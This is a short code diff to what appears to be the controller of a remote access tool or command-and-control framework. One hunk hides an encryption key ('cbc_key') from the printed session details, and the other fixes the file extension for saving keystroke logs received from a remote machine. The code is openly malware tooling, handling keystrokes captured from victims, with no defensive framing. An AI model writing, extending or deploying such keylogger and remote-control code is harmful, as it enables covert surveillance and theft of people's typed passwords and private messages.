@@ -118,7 +118,7 @@ class Control:
         info = self.server.get_address(self.es.socket)
         for key in info:
             # ignore outputting redundant information
-            if key != "connected" and key != "is_unix":
+            if key != "connected" and key != "is_unix" and key != "cbc_key":
                 out += f"{key}: {info[key]}\n"
 
         print(out, end="")
@@ -253,7 +253,7 @@ class Control:
             keylog = self.es.recvall(rsp["value"]["buffer"]).decode()
 
             try:
-                file_name = f"{os.getcwd()}/{time.strftime('keylog_%Y%m%d_%H%M%S.png')}"
+                file_name = f"{os.getcwd()}/{time.strftime('keylog_%Y%m%d_%H%M%S.txt')}"
                 with open(file_name, "w") as _file:
                     _file.write(keylog)
                 self.logger.info(f"Saved to {file_name}")
